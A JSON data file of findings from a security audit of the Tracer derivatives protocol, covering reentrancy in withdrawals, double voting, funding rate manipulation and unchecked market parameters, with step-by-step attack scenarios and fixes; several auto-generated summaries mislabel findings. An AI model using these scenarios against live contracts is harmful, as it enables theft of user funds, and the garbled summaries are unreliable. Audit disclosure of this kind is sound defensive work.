      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19741",
      "title": "Incorrect use of Absolute Value in Calculations",
      "impact": "LOW",
      "content": "Description\r\nThe function safeCalcTradeMargin() is a helper function in determining if a user is able to make a order by\r\ncalculating the users base and quote after applying the changes of the order.\r\nThe function safeCalcTradeMargin() incorrectly takes the absolute value of the price when calculating the\r\nchange to the base as seen in the following.\r\nint256 baseChange = ( amount . mul ( uint ( price . abs ()))). div ( priceMultiplier ). toInt256 ();\r\nA negative price should change the base in the opposite direction to a positive price.\r\nRecommendations\r\nWe recommend doing all calculations for baseChange asint256 types without taking absolute values or con-\r\nverting to uint256 .",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19740",
      "title": "Simple Majority Not Required to Pass Proposals",
      "impact": "LOW",
      "content": "Description\r\nThe Tracer governance contract, Gov.sol considers a proposal successful (i.e. in a PASSED state) as soon as\r\nexactly 50% of the staked votes are in favour of the proposal.\r\nThis means that Tracers governance does not require a strict, simple majority for proposals to be passed, as can\r\nbe see on line [ 265] of the Gov.sol contract:\r\nif( votes >= totalStaked . div (2)) {\r\nAs soon as this threshold is reached, no more votes can be cast by any participants. While this would be con-\r\nsidered acceptable in the case of \"No\" votes, a proposal should attract more than half of the total votes to be\r\ndeemed successful.\r\nRecommendations\r\nWe recommend replacing line [ 265] inGov.sol with a strict inequality where votes > totalStaked.div(2) .\r\nNote: Because voting calculations are made based on the total stake of the contract, rather than the number of \"yes\"\r\nvotes vs \"no\" votes, passing a proposal effectively requires an \"absolute\" majority, as the governance contract does not\r\nuse quorums",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19739",
      "title": "Insufficient Input Validation on proposalId in Voting Functions",
      "impact": "MEDIUM",
      "content": "Description\nWhen voting on an non-existent proposal, the related transaction on the Gov contract does not revert. This\nresults in the users lock up period being increased by lockDuration (see line [ 258]), even though their related\nvote is not valid nor counted.\nMistakes could be made by genuine users and result in an unfair increase of their lockup periods.\nRecommendations\nConsider reverting the vote external call if the Id of the proposal submitted as part of a vote is greater than the\nnumber of existing proposals, i.e.:\nrequire(proposalId <= proposalCounter)\nPage | 26\nTracer Protocol Detailed Findings\nTCR-18 Simple Majority Not Required to Pass Proposals",
      "summary": "\nThis bug report describes an issue with the voting process on the Gov contract. When a user votes on a non-existent proposal, the transaction does not revert, and the user's lock up period is still increased. This can be unfair to users who make mistakes and end up with an increased lock up period. The recommendation is to consider reverting the vote external call if the ID of the proposal is greater than the number of existing proposals. This bug report is related to TCR-18, which states that a simple majority is not required to pass proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19738",
      "title": "Insufficient Timing Parameter Validation",
      "impact": "MEDIUM",
      "content": "Description\nThe Tracer governance contract uses various timing-related variables to enforce a timeline between the different\nstages of a proposal ( warmUp ,coolingOff ,proposalDuration and lockDuration ).\nThese parameters can all be changed by participants of the protocols governance. There are no checks enforced\non the value of these parameters: they can all be set to 0 for example, rendering the governance unusable (for\nexample, any subsequent proposal would then have newProposal.startTime =newProposal.expiryTime =\nblock.timestamp)\nFurthermore, as outlined in TCR-12, implicit assumptions are made regarding the relationship between these\ntime variables. These relationships are not enforced when changing the value of these parameters.\nRecommendations\nConsider expressing and explicitly enforcing the constraints between the timing parameters in the governance\ncontract.\nPage | 25\nTracer Protocol Detailed Findings\nTCR-17 Insufficient Input Validation on proposalId in Voting Functions",
      "summary": "\nThis bug report is about the Tracer governance contract. The contract uses various timing-related variables to enforce a timeline between different stages of a proposal. These parameters can be changed by participants of the protocols governance, but there are no checks to ensure the values are valid. This can cause the governance to become unusable if the parameters are set to 0. Furthermore, assumptions are made about the relationship between these time variables, but these relationships are not enforced when changing the values. It is recommended that the constraints between the timing parameters be expressed and enforced in the governance contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19737",
      "title": "Reenterable Withdrawal Pattern",
      "impact": "MEDIUM",
      "content": "Description\nThe withdrawal of funds from the Account contract is vulnerable to reentrancy.\nfunction withdraw ( uint256 amount , address market ) external override {\nITracer _tracer = ITracer ( market );\nrequire ( amount > 0, \"ACT: Withdraw Amount <= 0\");\nTypes . AccountBalance storage userBalance = balances [ market ][ msg.sender ];\nrequire (\nmarginIsValid (\nuserBalance . base . sub ( amount . toInt256 ()) ,\nuserBalance .quote ,\npricing . fairPrices ( market ),\nuserBalance . lastUpdatedGasPrice ,\nmarket\n),\n\" ACT : Withdraw below valid Margin \"\n);\naddress tracerBaseToken = _tracer . tracerBaseToken ();\nIERC20 ( tracerBaseToken ). safeTransfer ( msg.sender , amount );\nuserBalance . base = userBalance . base .sub( amount . toInt256 ());\nuserBalance . deposited = userBalance . deposited .sub( amount );\nint256 originalLeverage = userBalance . totalLeveragedValue ;\n_updateAccountLeverage ( userBalance .quote , pricing . fairPrices ( market ),\nuserBalance .base , msg.sender , market , originalLeverage );\n// Safemath will throw if tvl [ market ] < amount\ntvl [ market ] = tvl [ market ]. sub ( amount );\nemit Withdraw ( msg.sender , amount , market );\n}\nThe above code in an excerpt of the function withdraw() . Here the check to ensure that\nthe margin is valid ( marginIsValid() ) occurs before the funds are transferred to the user in\nIERC20(tracerBaseToken).safeTransfer(msg.sender, amount) , which occurs before the balances are up-\ndated.\nIf a malicious user was able to gain control over the execution during\nIERC20(tracerBaseToken).safeTransfer(msg.sender, amount) then the user would be able\nto call withdraw() a second time. This second call to withdraw() would occur before the\nusers balances have been updated during the first iteration and so they will again pass the check\nisMarginValid() , even if the margin after both transfers would not be positive. Thus, the call\nIERC20(tracerBaseToken).safeTransfer(msg.sender, amount) will be made again. The user could\nthen take control of the execution and call withdraw() a third time and then a fourth and so on until they have\ndrained their entire userBalance.deposited after which there would be a subtraction underflow preventing\nfurther recursions.\nNote that the likelihood of this vulnerability is low as the majority of ERC20 tokens to do render control of\nPage | 23\nTracer Protocol Detailed Findings\nexecution to arbitrary addresses during a call to transfer() .\nRecommendations\nTo prevent reentrancy it is recommended to first perform all state updates before making\nany external calls to contracts which may be outside the protocols control. That is the line\nIERC20(tracerBaseToken).safeTransfer(msg.sender, amount) should occur after all state modifica-\ntions.\nSee TCR-27 for further details.\nPage | 24\nTracer Protocol Detailed Findings\nTCR-16 Insufficient Timing Parameter Validation",
      "summary": "\nThis bug report is about the vulnerability of the withdrawal of funds from the Account contract to reentrancy. The bug is caused by the order of operations in the function withdraw(). The check to ensure that the margin is valid (marginIsValid()) occurs before the funds are transferred to the user in IERC20(tracerBaseToken).safeTransfer(msg.sender, amount), which occurs before the balances are updated. This means that if a malicious user is able to gain control over the execution during the transfer, they can call withdraw() a second time before the user's balance is updated. Thus, they can call the transfer multiple times, draining the user's balance until there is an underflow. To prevent this vulnerability, it is recommended to first perform all state updates before making any external calls to contracts which may be outside the protocol's control.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19736",
      "title": "Insurance Pool Tokens Can Be Transferred Without Claiming Rewards",
      "impact": "MEDIUM",
      "content": "Description\nThe InsurancePoolToken contract overrides the transfer() function, enforcing the current user to with-\ndraw their rewards before transferring any amount of tokens to a new account. However, the ERC20\ntransferFrom() does not have a similar override. This means a staker can transfer their tokens to another\naccount without withdrawing their rewards, leaving unclaimed rewards in the pool.\nNOTE: See the accompanying tests for the insurance pool token for an example of this in practice.\nRecommendations\nThe transferFrom() function should also be overridden to call _withdrawFunds() and/or handled with the\ncorrection for TCR-05.\nPage | 22\nTracer Protocol Detailed Findings\nTCR-15 Reenterable Withdrawal Pattern",
      "summary": "\nThis bug report is regarding the InsurancePoolToken contract, which has an override on the transfer() function, requiring the current user to withdraw their rewards prior to transferring any amount of tokens to a new account. However, the ERC20 transferFrom() function does not have a similar override, which means a staker can transfer their tokens to another account without withdrawing their rewards, leaving unclaimed rewards in the pool. It is recommended that the transferFrom() function should also be overridden to call _withdrawFunds() and/or handled with the correction for TCR-05. This bug has been labeled TCR-15 Reenterable Withdrawal Pattern.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19735",
      "title": "get24HourPrices() Forces Prices to be Positive",
      "impact": "MEDIUM",
      "content": "Description\nCalculation of get24HourPrices() takes the average price for each hour in the last twenty-four (24) hours.\nThen takes an average of those hours.\nDuring the calculations each hourly price is converted to a uint256 after taking the absolute value as such\n(uint256(hourlyPrice.totalPrice.abs()) .\nThis will have undesirable effects for prices which fluctuate between positive an negative numbers. This is\nbecause price xandxwill be treated the same in the average.\nRecommendations\nConsider keeping the prices as int256 to account for cases where prices may fluctuate between positive and\nnegative values.\nPage | 21\nTracer Protocol Detailed Findings\nTCR-14 Insurance Pool Tokens Can Be Transferred Without Claiming Rewards",
      "summary": "\nThe bug report is about the calculation of the get24HourPrices() which takes the average price for each hour in the last 24 hours. The hourly prices are converted to a uint256 after taking the absolute value, which can have undesired effects when prices fluctuate between positive and negative numbers. The recommendation is to keep the prices as int256 to account for these cases.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19734",
      "title": "Possible Double Voting for Proposers",
      "impact": "MEDIUM",
      "content": "Description\nIf the lockupPeriod is less than the proposalDuration , it is possible for a proposer to have their votes (i.e.\namount staked) counted twice.\nConsider the following scenario:\n1. The lockupPeriod is reduced to 1 day by a successful proposal. The proposalDuration is stil set to its\ndefault value of 3 days.\n2. Alice submits an arbitrary proposal (the targets/data for this proposal do not matter for the purpose of this\nexample). As the proposer, her entire staked amount (lets assume 1000 tokens) is counted as a Yesvote.\n3. Alice waits 1 day, then proceeds to delegate her votes to Bob (who has the same amount of staked tokens,\n1000 ).\n4. Bob proceeds to vote in favour of Alices proposal. Because Alice delegated her tokens to him, Bob can\nvote with an amount of 2000 tokens.\n5. As a result, at this stage, the total amount of Yesvotes equals 3000 tokens, while the amount of actual\nstake backing these votes is only 2000\n6. Alices votes have effectively been counted twice.\nRefer to the test test_double_vote() intest_gov.py for a proof of concept.\nRecommendations\nEnsure that no vote is counted twice, even for short lockup periods. Consider restricting the values of the\nlockupPeriod to be greater than or equal to the proposalDuration .\nPage | 20\nTracer Protocol Detailed Findings\nTCR-13 get24HourPrices() Forces Prices to be Positive",
      "summary": "\nThis bug report describes a scenario where a proposer's votes (i.e. amount staked) can be counted twice if the lockupPeriod is less than the proposalDuration. The scenario begins with the lockupPeriod being reduced to 1 day by a successful proposal, while the proposalDuration is still set to its default value of 3 days. Alice then submits an arbitrary proposal and her entire staked amount is counted as a Yesvote. Alice then delegates her votes to Bob, who has the same amount of staked tokens, and Bob votes in favour of Alice's proposal. At this stage, the total amount of Yesvotes equals 3000 tokens, while the amount of actual stake backing these votes is only 2000. As a result, Alice's votes have effectively been counted twice. \n\nThe bug report recommends that no vote should be counted twice, even for short lockup periods, and suggests considering restricting the values of the lockupPeriod to be greater than or equal to the proposalDuration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19733",
      "title": "Double Voting by Delegaters",
      "impact": "HIGH",
      "content": "Description\nIf a user has delegated their voting rights to another member of the governance network, the recipient of these\nrights is able to propose/vote with the combined value of their stake plus any delegated stake. However, as\nthere are no restrictions on withdrawing delegated stake once a vote has already been made, a user is able to\ndouble vote by transferring this stake to another account and voting on the same proposal.\nThis process can be further outlined in the following scenario:\n1. Alice and Bob both decide they want to stake their governance tokens.\n2. Bob delegates his stake to Alice, relinquishing him of his voting rights until he decides to remove Alice as\nhis delegate.\n3. Alice submits an arbitrary proposal, whereby her entire stake (including any delegated stake) is counted as\naYesvote.\n4. Alice and Bob both wait some time for the warm up period to pass and then Bob proceeds to withdraw his\nstake while the proposal is still actively being voted on.\n5. Bob then transfers his governance token to an arbitrary account controlled by him and restakes his gover-\nnance tokens.\n6. With no cooldown on voting after staking, Bob is able to vote on the same proposal, effectively double\nvoting.\nRefer to the test test_withdraw_double_vote() intest_gov.py for a proof of concept.\nRecommendations\nEnsure that no vote is counted twice and potentially add a lockup period when entering and exiting the system.\nAlternatively, voting could be restricted to pre-existing users who have staked their funds before the respective\nproposal has been made.\nPage | 19\nTracer Protocol Detailed Findings\nTCR-12 Possible Double Voting for Proposers",
      "summary": "\nThis bug report describes a problem with voting rights in a governance network. If a user has delegated their voting rights to another member, the recipient of these rights is able to propose/vote with the combined value of their stake plus any delegated stake. However, as there are no restrictions on withdrawing delegated stake once a vote has already been made, a user is able to double vote by transferring this stake to another account and voting on the same proposal. This process is outlined in a scenario in the report. The recommendation is to ensure that no vote is counted twice and potentially add a lockup period when entering and exiting the system, or alternatively, voting could be restricted to pre-existing users who have staked their funds before the respective proposal has been made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19732",
      "title": "Insurance Funding Rate Increases Indefinitely",
      "impact": "HIGH",
      "content": "Description\nThe insurance funding rate is calculated in Insurance.getPoolFundingRate() to be proportional to the dif-\nference between the leveraged notional value and pool holdings. The value returned from this function is a\nuint256 as the insurance funding rate should be non-negative.\nWhen the insurance funding rate is being updated in Pricing.updateFundingRate() the following occurs.\nint256 currentInsuranceFundingRateValue =\ngetOnlyInsuranceFundingRateValue (market , fundingIndex );\nint256 IPoolFundingRateValue = currentInsuranceFundingRateValue . add ( IPoolFundingRate );\nHere IPoolFundingRate = Insurance.getPoolFundingRate() and thus is always greater than or\nequal to zero (0). The value IPoolFundingRateValue which adds IPoolFundingRate and the\ncurrentInsuranceFundingRateValue then becomes the new insurance funding rate value.\nSince we are taking the current insurance funding rate value and adding a number that is greater than or equal\nto zero, the new insurance funding rate value may only ever increase.\nThe impact here is that users will have to pay significant fees to the insurance pool even when the pool has\nreached the target amount.\nRecommendations\nConsider removing the step where the insurance funding rate is added to the previous insurance funding rate,\nsuch that the value is set to the output of Insurance.getPoolFundingRate() .\nPage | 18\nTracer Protocol Detailed Findings\nTCR-11 Double Voting by Delegaters",
      "summary": "\nThis bug report is about the insurance funding rate in a protocol. The insurance funding rate is calculated in Insurance.getPoolFundingRate() and should be a non-negative number. In Pricing.updateFundingRate(), the current insurance funding rate value is added to the IPoolFundingRateValue (which is always greater than or equal to zero). This means that the new insurance funding rate value can only ever increase, resulting in users having to pay significant fees to the insurance pool even when the pool has reached the target amount. The recommendation to fix this bug is to consider removing the step where the insurance funding rate is added to the previous insurance funding rate, such that the value is set to the output of Insurance.getPoolFundingRate().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19731",
      "title": "Signature Use in Alternate Markets",
      "impact": "HIGH",
      "content": "Description\nThe Trader contract makes trades on behalf of users. The purpose is that it is an off-chain order book system\nwhich can execute orders on-chain on a users behalf.\nIt proves a user requested an order by having them sign the hashOrder() of a LimitOrder . This ensures that\nthe details of the order match those desired by the user.\nThe LimitOrder contains the field targetTracer which links the order to a specific market. However, the\nfunction executeTrade(makers, takers, market) does not ensure that the function parameter market\nmatches the variable targetTracer in the order.\nThe impact is that a user may call executeOrder() using signatures that were intended for a different market.\nSince different markets will have different prices this will result in users creating highly unprofitable trades. A\nmalicious user may capitalise on this by taking the opposite side of these trades.\nThis attack would require the user to have given permission to the Trader in both markets, for the users margin\nto be valid after the trade and finally for the transaction to have a valid nonce.\nRecommendations\nA check should be added to each order to ensure that the order.targetTracer == market , thereby preventing\norders to be executed in other markets.\nPage | 17\nTracer Protocol Detailed Findings\nTCR-10 Insurance Funding Rate Increases Indefinitely",
      "summary": "\nThe Trader contract is an off-chain order book system that allows users to make trades on their behalf. It does this by having users sign the hashOrder() of a LimitOrder, which contains a field called targetTracer, which links the order to a specific market. The problem is that the function executeTrade(makers, takers, market) does not ensure that the function parameter market matches the variable targetTracer in the order. This means that a user may call executeOrder() using signatures that were intended for a different market, resulting in unprofitable trades. A malicious user could take advantage of this by taking the opposite side of these trades. To prevent this attack, it is recommended that a check be added to each order to ensure that the order.targetTracer == market.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19730",
      "title": "Risk Free Negative Price Trades",
      "impact": "HIGH",
      "content": "Description\nThe tracer markets are designed to allow for negative price trades. However users can make trades without mak-\ning deposits (or can make a trade and then withdraw their initial deposit (see Maximum Withdrawal Observations\nfor a simple analysis)).\nThe issue occurs due to the calculations of notional value, |quote|price fairThus if price fair<0notional value\nwill be less than zero. Since minMargin is a portion of the notional value it will also be negative (excluding\npotential liquidation gas costs).\nNow if we take an order at the price fairthen our margin will be zero.\nThus, the check margin > minMargin inmarginIsValid() will always pass even though as user has made no\ndeposits.\nRecommendations\nUpdate the calculations for minMargin() , leveraged notional value and notional value to handle the cases where\npricing is negative.\nPage | 16\nTracer Protocol Detailed Findings\nTCR-09 Signature Use in Alternate Markets",
      "summary": "\nA bug has been identified in the tracer markets, which allow for negative price trades. Users are able to make trades without making deposits or withdrawing their initial deposits, which can lead to an issue with the notional value calculation. If the price fair is negative, the notional value will also be negative, and the check margin > minMargin inmarginIsValid() will always pass, even though the user has not made any deposits. To fix this issue, the calculations for minMargin(), leveraged notional value and notional value should be updated to address cases where pricing is negative.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19729",
      "title": "Hourly Price Consists of a Single Trade",
      "impact": "HIGH",
      "content": "Description\nWhen an order is matched or taken, the funding rate is updated through two calls to Pricing . These calls are\nupdatePrices() and updateFundingRate() .\nInTracer.updateInternalRecords() if more than an hour has passed, currentHour is incre-\nmented by one (1) modulus twenty-four (24). We then call Pricing.updatePrice() followed by\nPricing.updateFundingRate() as seen in the excerpt below.\nif( currentHour == 23) {\ncurrentHour = 0;\n}else {\ncurrentHour = currentHour + 1;\n}\n// Update pricing and funding rate states\npricingContract . updatePrice (price , ioracle . latestAnswer (), true ,address (this ));\nint256 poolFundingRate = insuranceContract . getPoolFundingRate ( address (this )). toInt256 ();\npricingContract . updateFundingRate ( address (this ), ioracle . latestAnswer (), poolFundingRate );\nAn issue arises here as the call to Pricing.updatePrice() has the parameter newRecord flag set to true .\nThis means that pricing.hourlyTracerPrices[currentHour] will consist of a single answer (the one from\nthe current order).\nDuring the call to Pricing.updateFundingRate() when calculating the TWAPs\ngetHourlyAvgTracerPrice(uint256(j), market) and getHourlyAvgOraclePrice(uint256(j), market)\nboth will only have one entry for currentHour , which is the current trade.\nSince currentHour will have the highest weighting (8) it will therefore have\n8\n8 + 7 + 6 + 5 + 4 + 3 + 2 + 1= 22%\nNote this issue is exaggerated when less than twenty-four (24) hours have past. Example after completion of\nthe first hour it would be8\n8 + 7= 53%\nA user who is able to manipulate the fundingRate will be able to receive significant compensation in future\ntrades through the calculation of their base in Account.settle() , allowing them to inflate their profits at the\nexpense of users holding the opposite position.\nPage | 14\nTracer Protocol Detailed Findings\nRecommendations\nThis issue may be mitigated by calculating the TWAPs in Pricing.updateFundingRate() for\ncurrentHour - 1 thereby ignoring the most recent trade.\nAlternatively the issue may also be mitigated in Trace.updateInternalRecords() by calling\nPricing.updatePrice() and Pricing.updateInternalRecords() before incrementing currentHour .\nPage | 15\nTracer Protocol Detailed Findings\nTCR-08 Risk Free Negative Price Trades",
      "summary": "\nThe bug report is about a risk free negative price trade in the Tracer Protocol. The issue arises when an order is matched or taken and the funding rate is updated through two calls to Pricing. In the call to Pricing.updatePrice(), the newRecord flag is set to true which means that pricing.hourlyTracerPrices[currentHour] will only have the current trade. This leads to a high weighting of the currentHour, leading to a significant compensation for the user who is able to manipulate the funding rate. \n\nThe issue can be mitigated by calculating the TWAPs in Pricing.updateFundingRate() for currentHour - 1, thereby ignoring the most recent trade. Alternatively, the issue may also be mitigated in Trace.updateInternalRecords() by calling Pricing.updatePrice() and Pricing.updateInternalRecords() before incrementing currentHour.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19728",
      "title": "Restriction on User Withdrawals",
      "impact": "HIGH",
      "content": "Description\nThe contract Account is used to store the balance ERC20 Tokens that users have deposited in the markets.\nThese user balances are updated as users make trades. A user who makes a profit from these trades would then\nwithdraw their profits and/or deposited balance via the function withdraw() .\nOn line [ 138] of the function withdraw() the users deposited balance is updated as such\nuserBalance.deposited = userBalance.deposited.sub(amount); .\nThe variable userBalance.deposited is only increased when a user makes a deposit and decreased when a\nuser withdraws. Since this function uses SafeMath and deposited is of type uint256 the function will revert\nif a user attempts to withdraw more than the total balance they have deposited.\nThe implications are that a user will be unable to withdraw profits, their withdrawals are limited to the amount\nthey have deposited.\nRecommendations\nWe recommend removing the field deposited from the type AccountBalance and remove the instances\nwhere it is used.\nPage | 13\nTracer Protocol Detailed Findings\nTCR-07 Hourly Price Consists of a Single Trade",
      "summary": "\nThis bug report is about the contract Account used to store the balance of ERC20 Tokens that users have deposited in the markets. The user balance is updated as the user makes trades. When a user attempts to withdraw their profits and/or deposited balance via the function withdraw() on line 138, the variable userBalance.deposited is only decreased. This causes the function to revert if a user attempts to withdraw more than the total balance they have deposited, meaning they are unable to withdraw profits. \n\nThe recommendation is to remove the field deposited from the type AccountBalance and remove the instances where it is used. This will allow users to withdraw profits and their deposits without the function reverting.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19727",
      "title": "Malicious Users Can Take All Rewards and Prevent Transfers",
      "impact": "HIGH",
      "content": "Description\nThe InsurancePoolToken contract is designed to hold a number of stakers and reward them with tracer tokens\nbased on the stakers token share.\nThe contract overrides the transfer() function, enforcing the current user to withdraw their rewards before\ntransferring any amount of tokens to a new account. However, the new account has no such modification and\ncan withdraw an equal share as the original transferrer. This means a single staker can withdraw their rewards\nthen transfer their tokens to a new address that they own and repeat the process until the rewards are entirely\ndrained from the contract.\nA follow on effect is that current users in the system can no longer withdraw rewards, in fact the\n_withdrawFunds() function will revert when the rewards are depleted but users are still entitled to rewards\n(due to the safe math subtraction). This means that in this scenario, a malicious user also prevents honest users\nfrom using the transfer() function as it will revert due to lack of rewards.\nNOTE: See the accompanying tests for the insurance pool token for an example of this in practice.\nRecommendations\nTransfers of tokens to other accounts need to update the other accounts lastRewardsUpdate . Care needs to\nbe taken to not simply reset the variable to prevent malicious users from sending tokens to negatively effect\nother users.\nOne potential solution, is to also call _withdrawFunds() on the toaddress before the tokens get transferred.\nThis will however mean that users can force other users to withdraw their share of tokens at any time.\nThe correction to this issue, should also go hand in hand with the correction to TCR-14.\nPage | 12\nTracer Protocol Detailed Findings\nTCR-06 Restriction on User Withdrawals",
      "summary": "\nThis bug report is about the InsurancePoolToken contract, which is designed to hold a number of stakers and reward them with tracer tokens based on the staker's token share. The contract overrides the transfer() function, enforcing the current user to withdraw their rewards before transferring any amount of tokens to a new account. However, the new account has no such modification, meaning a single staker can withdraw their rewards then transfer their tokens to a new address they own and repeat the process until the rewards are entirely drained from the contract. This also means that current users in the system can no longer withdraw rewards, as the _withdrawFunds() function will revert when the rewards are depleted.\n\nThe recommendation for correction to this issue is to update the other accounts lastRewardsUpdate when transferring tokens to them. Additionally, there should be a call to _withdrawFunds() on the toaddress before the tokens get transferred. This will prevent malicious users from sending tokens to negatively effect other users, but also mean that users can force other users to withdraw their share of tokens at any time. The correction to this issue should also go hand in hand with the correction to TCR-14.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19726",
      "title": "claimReceipts() market Parameter is Unchecked",
      "impact": "HIGH",
      "content": "Description\nInAccount.claimReceipts() the parameter market isnt verified against the receipt.tracer . This allows\na user to claim receipts based on orders that originate from other (malicious) tracer markets.\nThis vulnerability is classified as high impact as it is an example of how a malicious tracer market can effect\nlegitimate tracer markets.\nThis vulnerability allows malicious users to withdraw maximum funds from the insurance pool by manipulating\nfake orders in malicious tracers. Malicious users could liquidate themselves on legitimate markets and claim\norders on fake markets.\nRecommendations\nWe recommend retrieving the market from the receipt object, specifically receipt.tracer . Then removing\nthe parameter market from both Account.claimReceipts() and Receipt.claimReceipts() .\nPage | 11\nTracer Protocol Detailed Findings\nTCR-05 Malicious Users Can Take All Rewards and Prevent Transfers",
      "summary": "\nThis bug report is about a vulnerability in the Account.claimReceipts() function of the Tracer Protocol. The vulnerability is that the parameter market is not verified against the receipt.tracer, which allows malicious users to claim receipts from other (malicious) tracer markets. This can have a high impact as it can allow malicious users to withdraw the maximum funds from the insurance pool by manipulating fake orders in malicious tracers.\n\nThe recommendation to fix this vulnerability is to retrieve the market from the receipt object and then remove the parameter market from both Account.claimReceipts() and Receipt.claimReceipts(). This would prevent malicious users from taking all rewards and prevent transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19725",
      "title": "Funding Rate Manipulation #2",
      "impact": "HIGH",
      "content": "Description\nThe funding rate is a time-weighted average difference between the oracle price and the market price. Users\nare either rewarded or taxed based on whether the oracle price is above or below the market price and whether\nthey are long or short.\nUsers are able to manipulate their funding rate index to potentially earn themselves rewards and/or avoid paying\nfees.\nThe funding rate will be applied to a trade after the base and quote have been adjusted for the trade as:\nbase =base(currentGlobalRate currentUserRate )quote\nConsider the following example where:\ncurrentGlobalRate > 0\nuser 1anduser 2have currentUserRate i= 0\nThe following steps can be used in increase a users base.\n1.user 1anduser 2both deposit amount direspectively,\n2.user 1makes a trade of negligible size (or trades with them self) such that currentUserRate 1=currentGlobalRate\n3.trade 1:{price 1, amount 1, longUser :user 1, shortUser :user 2}\nSince currentUserRate 1=currentGlobalRate :\nuser 1:base =d1amount 1price 1(currentGlobalRate currentUserRate 1)amount 1\n=d1amount 1price 1\nSince user 2was short the quote will be negative the amount of the trade and currentUserRate 2= 0\nhence:\nuser 2:base =d2+amount 1price 1(currentGlobalRate currentUserRate 2)(amount 1)\n=d2+amount 1price 1+currentGlobalRate amount 1\nBoth user will now have currentUserRate =currentGlobalRate .\nPage | 9\nTracer Protocol Detailed Findings\n4. We now close the position through trade 2:{price 1, amount 1, longUser :user 2, shortUser :user 1}\nwhich gives us\nuser 1:base =d1\nuser 2:base =d2+currentGlobalRate amount 1\nThis attack can be applied if currentGlobalRate < 0by switching the long and short users in 